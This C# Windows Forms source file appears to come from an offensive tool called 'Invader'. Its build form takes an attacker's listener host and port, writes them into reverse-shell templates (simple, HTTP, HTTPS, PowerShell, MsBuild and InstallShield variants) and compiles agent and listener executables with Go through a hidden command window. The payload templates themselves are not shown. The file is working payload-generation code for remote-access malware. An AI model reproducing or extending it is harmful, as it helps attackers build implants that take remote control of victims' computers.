using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Invader
{
    internal partial class BuildForm : Form
    {
        //[DllImport("user32.dll")]
        // static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
        #region methods

        private void BuildExe(string filename, bool isManager)
        {

            ProcessStartInfo pinfo = new ProcessStartInfo();
            pinfo.CreateNoWindow = true;
            pinfo.UseShellExecute = false;
            //pinfo.Verb = "runas"; ;

            pinfo.FileName = "cmd.exe";
            pinfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (!isManager)
            {
                pinfo.Arguments = "/k go build " + "-o " + Directory.GetParent(filename).FullName + @"\" + txtagentname.Text + ".exe" + " " + filename;
            }
            else
            {
                pinfo.Arguments = "/k go build " + "-o " + Directory.GetParent(filename).FullName + @"\" + txtagentname.Text + "Listener" + ".exe" + " " + filename;

            }
            try
            {
                // Start the process with the info we specified.
                // Call WaitForExit and then the using statement will close.
                using (Process exeProcess = Process.Start(pinfo))
                {
                    //SetParent(exeProcess.MainWindowHandle, this.Handle);
                    exeProcess.WaitForExit(3000);
                }
            }
            catch
            {
                // Log error.
            }

        }

        #endregion
        public BuildForm()
        {
            if (!this.DesignMode)
            {
                InitializeComponent();
            }
        }

        private void btnclose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void BuildForm_Load(object sender, EventArgs e)
        {
            lblHeading.Text = SharedProps.GetInstance.FormCaption;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            Cursor oCurrent = Cursor.Current;
            try
            {
                this.Cursor = Cursors.WaitCursor;

                btnBuild.Enabled = false;
                btnShowfile.Enabled = true;
                switch (SharedProps.GetInstance.CurrentSelection)
                {
                    case SharedProps.SelectedShellType.SimpleReverseShell:
                        SharedProps.GetInstance.UpdateSimpleShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text, false);
                        SharedProps.GetInstance.UpdateSimpleShellTemplate(txtlport.Text, SharedProps.GetInstance.ManagerFile, txtagentname.Text, true);
                        break;
                    case SharedProps.SelectedShellType.HybridReverseShell:
                        break;
                    case SharedProps.SelectedShellType.HttpsReverseShell:
                        SharedProps.GetInstance.UpdateHttpsShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text, false);
                        SharedProps.GetInstance.UpdateHttpsShellTemplate(txtlport.Text, SharedProps.GetInstance.ManagerFile, txtagentname.Text, true);
                        break;
                    case SharedProps.SelectedShellType.HttpReverseShell:
                        SharedProps.GetInstance.UpdateHttpReverseShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text, false);
                        SharedProps.GetInstance.UpdateHttpReverseShellTemplate(txtlport.Text, SharedProps.GetInstance.ManagerFile, txtagentname.Text, true);
                        break;
                    case SharedProps.SelectedShellType.PSReverseShell:
                        SharedProps.GetInstance.UpdatePowerShellReverseShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text);
                        break;
                    case SharedProps.SelectedShellType.MsBuildReverseShell:
                        SharedProps.GetInstance.UpdateMsBuildReverseShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text);
                        break;
                    case SharedProps.SelectedShellType.InstallShieldReverseShell:
                        SharedProps.GetInstance.UpdateInstallShieldReverseShellTemplate(txtlhost.Text + ":" + txtlport.Text, SharedProps.GetInstance.SourceFile, txtagentname.Text);
                        break;
                    case SharedProps.SelectedShellType.None:
                        break;
                    default:
                        break;
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            finally
            {
                this.Cursor = oCurrent;
            }


        }

        private void btnShowFile_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = Directory.GetParent(SharedProps.GetInstance.OutFilePath).FullName,
                UseShellExecute = true,
                Verb = "open"
            });

            btnShowfile.Enabled = false;
            btnBuild.Enabled = true;
            //   new ListenerForm().ShowDialog();
        }
    }
}
